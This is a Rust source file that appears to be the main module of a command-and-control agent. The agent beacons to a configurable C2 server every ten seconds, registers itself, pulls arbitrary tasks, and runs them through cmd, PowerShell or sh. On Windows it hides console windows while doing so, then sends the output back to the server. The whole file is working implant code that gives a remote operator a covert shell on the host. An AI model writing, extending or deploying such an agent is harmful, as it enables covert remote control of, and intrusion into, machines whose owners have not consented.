mod state;
mod system;
mod network;
mod protocols;

use protocol::Task;
use state::AgentState;
use std::process::Command;
use std::time::Duration;
use tokio::time;
use std::env;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

const BEACON_INTERVAL: u64 = 10;

#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

fn get_server_url() -> String {
    env::var("C2_SERVER")
        .unwrap_or_else(|_| {
            env::args()
                .nth(1)
                .unwrap_or_else(|| "http://127.0.0.1:8080".to_string())
        })
}

async fn execute_task(task: &Task, state: &mut AgentState) -> (String, i32) {
    println!("[*] Executing task {}: {}", task.task_id, task.command);

    if task.command.starts_with("PROTOCOL:") {
        return protocols::execute_protocol(&task.command, state).await;
    }

    // Detect if command is PowerShell or CMD
    let is_powershell = task.command.trim_start().starts_with("powershell") 
        || task.command.trim_start().starts_with("pwsh")
        || task.command.contains("Get-")
        || task.command.contains("Set-")
        || task.command.contains("Invoke-")
        || task.command.contains("New-Object");

    #[cfg(target_os = "windows")]
    let output = if is_powershell {
        // PowerShell execution
        let ps_command = if task.command.trim_start().starts_with("powershell") 
            || task.command.trim_start().starts_with("pwsh") {
            // Command already includes powershell/pwsh
            task.command.clone()
        } else {
            // Wrap command in powershell
            format!("powershell.exe -NoProfile -NonInteractive -Command \"{}\"", 
                task.command.replace("\"", "\\\""))
        };

        Command::new("cmd")
            .args(["/C", &ps_command])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
    } else {
        // Regular CMD execution
        Command::new("cmd")
            .args(["/C", &task.command])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
    };

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh")
        .args(["-c", &task.command])
        .output();

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let combined = format!("{}{}", stdout, stderr);
            let exit_code = output.status.code().unwrap_or(-1);
            println!("[+] Task {} completed with exit code {}", task.task_id, exit_code);
            (combined, exit_code)
        }
        Err(e) => {
            println!("[-] Task {} execution error: {}", task.task_id, e);
            (format!("Execution error: {}", e), -1)
        }
    }
}

#[tokio::main]
async fn main() {
    let server_url = get_server_url();
    println!("[*] C2 Agent starting...");
    println!("[*] Server: {}", server_url);
    
    let client = reqwest::Client::new();
    let mut state = AgentState::new();
    let mut interval = time::interval(Duration::from_secs(BEACON_INTERVAL));

    loop {
        interval.tick().await;

        if state.agent_id.is_none() {
            println!("[*] Attempting to register with C2 server...");
            if let Err(e) = network::communication::register_agent(&client, &mut state, &server_url).await {
                println!("[-] Registration failed: {}. Retrying...", e);
                continue;
            }
        }

        match network::communication::send_beacon(&client, &state, &server_url).await {
            Ok(Some(task)) => {
                let (output, exit_code) = execute_task(&task, &mut state).await;
                
                if let Err(e) = network::communication::send_task_result(
                    &client,
                    state.agent_id.unwrap(),
                    task.task_id,
                    output,
                    exit_code,
                    &server_url,
                )
                .await
                {
                    println!("[-] Failed to send task result: {}", e);
                }
            }
            Ok(None) => {
                println!("[*] No tasks available");
            }
            Err(e) => {
                println!("[-] Beacon error: {}. Will retry...", e);
            }
        }
    }
}
